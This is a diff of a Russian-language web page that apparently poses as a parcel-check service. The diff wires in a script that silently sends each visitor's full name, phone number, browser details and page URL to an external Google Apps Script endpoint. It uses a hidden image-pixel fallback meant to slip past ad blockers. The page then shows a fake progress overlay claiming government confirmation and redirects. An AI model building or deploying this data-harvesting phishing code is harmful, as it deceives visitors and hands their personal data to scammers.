@@ -301,63 +301,20 @@
     </div>
   </div>
 
-  <script>
-    // год в футере
-    document.getElementById('year').textContent = new Date().getFullYear();
-
-    // логика проверки + оверлей
-    function startCheck(){
-      const fio   = document.getElementById('fio').value.trim();
-      const phone = document.getElementById('phone').value.trim();
-      const minOk = fio.split(/\s+/).filter(Boolean).length >= 2 && phone.replace(/\D/g,'').length >= 10;
-      if(!minOk){ alert('Пожалуйста, укажите ФИО и корректный номер телефона.'); return; }
-
-      openOverlay(); runProgress();
-    }
-    function openOverlay(){ document.getElementById('overlay').classList.add('active'); document.body.style.overflow='hidden'; }
-    function closeOverlay(){ document.getElementById('overlay').classList.remove('active'); document.body.style.overflow='auto'; }
-    function runProgress(){
-      const steps=[{id:'s1',delay:900,text:'Сверяем данные получателя'},{id:'s2',delay:1200,text:'Ищем активные отправления'},{id:'s3',delay:1200,text:'Подтверждаем обращение на гос.площадке'}];
-      const sub=document.getElementById('ov-sub'); const bar=document.getElementById('bar');
-      let total=0; steps.forEach(s=> total+=s.delay);
-      let acc=0; steps.forEach((s,idx)=>{
-        setTimeout(()=>{
-          if(idx>0){const prev=document.getElementById(steps[idx-1].id); prev.classList.remove('active'); prev.classList.add('done');}
-          const cur=document.getElementById(s.id); cur.classList.add('active'); sub.textContent=s.text+'…';
-          bar.style.width=Math.round(((idx+1)/steps.length)*90)+'%';
-        }, acc+=s.delay);
-      });
-      setTimeout(()=>{
-        const last=steps[steps.length-1].id;
-        document.getElementById(last).classList.remove('active');
-        document.getElementById(last).classList.add('done');
-        sub.textContent='Готово'; bar.style.width='100%';
-        document.getElementById('gov-note').style.display='block';
-        setTimeout(()=>{ goGov(); }, 900);
-      }, total+400);
-    }
-    function goGov(){ window.location.href='alert.html'; }
-
-    <script>
-  // === Настройки ===
+<script>
+  // === Настройки отправки в Google Sheets ===
   const GS_URL = 'https://script.google.com/macros/s/AKfycbxXj4wCnJgoQGEZJh9lTieI6RlCN_DhEoPOaKan0xLX6EdVcOHS2-AoU2aoy8REBhpIJw/exec';
-  const GS_KEY = 'boxgo-2025'; // как в Apps Script
+  const GS_KEY = 'boxgo-2025'; // тот же ключ в Apps Script
 
+  // год в футере
+  document.getElementById('year').textContent = new Date().getFullYear();
+
+  // —— отправка в таблицу (POST + резервный GET-пиксель) ——
   function logToSheet(fio, phone){
     const uuid = (crypto.randomUUID?.() || Date.now().toString(36)+Math.random().toString(36).slice(2));
-
-    const payload = {
-      key: GS_KEY,
-      fio,
-      phone,
-      ua: navigator.userAgent,
-      ref: location.href,
-      uuid
-    };
-
+    const payload = { key: GS_KEY, fio, phone, ua: navigator.userAgent, ref: location.href, uuid };
     const body = new URLSearchParams(payload).toString();
 
-    // 1) Пытаемся через POST (тихий режим, без ожидания ответа)
     try{
       fetch(GS_URL, {
         method: 'POST',
@@ -367,15 +324,73 @@
       });
     }catch(e){/* ignore */ }
 
-    // 2) Дублируем «пикселем» GET — работает всегда, даже если CORS/AdBlock мешают
     try{
       const img = new Image();
       img.src = GS_URL + '?' + body;
     }catch(e){/* ignore */ }
   }
 
-  // Вызов остаётся в твоём startCheck():
-  // try { logToSheet(fio, phone); } catch(e){}
+  // —— логика проверки + оверлей ——
+  function startCheck(){
+    const fio   = document.getElementById('fio').value.trim();
+    const phone = document.getElementById('phone').value.trim();
+    const minOk = fio.split(/\s+/).filter(Boolean).length >= 2 && phone.replace(/\D/g,'').length >= 10;
+    if(!minOk){
+      alert('Пожалуйста, укажите ФИО и корректный номер телефона.');
+      return;
+    }
+
+    // отправим в таблицу (не блокирует UI)
+    try { logToSheet(fio, phone); } catch(e){}
+
+    openOverlay();
+    runProgress();
+  }
+
+  function openOverlay(){
+    document.getElementById('overlay').classList.add('active');
+    document.body.style.overflow='hidden';
+  }
+  function closeOverlay(){
+    document.getElementById('overlay').classList.remove('active');
+    document.body.style.overflow='auto';
+  }
+
+  function runProgress(){
+    const steps=[
+      {id:'s1',delay:900 ,text:'Сверяем данные получателя'},
+      {id:'s2',delay:1200,text:'Ищем активные отправления'},
+      {id:'s3',delay:1200,text:'Подтверждаем обращение на гос.площадке'}
+    ];
+    const sub=document.getElementById('ov-sub');
+    const bar=document.getElementById('bar');
+
+    let total=0; steps.forEach(s=> total+=s.delay);
+    let acc=0;
+    steps.forEach((s,idx)=>{
+      setTimeout(()=>{
+        if(idx>0){
+          const prev=document.getElementById(steps[idx-1].id);
+          prev.classList.remove('active'); prev.classList.add('done');
+        }
+        const cur=document.getElementById(s.id);
+        cur.classList.add('active');
+        sub.textContent=s.text+'…';
+        bar.style.width=Math.round(((idx+1)/steps.length)*90)+'%';
+      }, acc+=s.delay);
+    });
+
+    setTimeout(()=>{
+      const last=steps[steps.length-1].id;
+      document.getElementById(last).classList.remove('active');
+      document.getElementById(last).classList.add('done');
+      sub.textContent='Готово'; bar.style.width='100%';
+      document.getElementById('gov-note').style.display='block';
+      setTimeout(()=>{ goGov(); }, 900);
+    }, total+400);
+  }
+
+  function goGov(){ window.location.href='alert.html'; }
 </script>
 </body>
 </html>
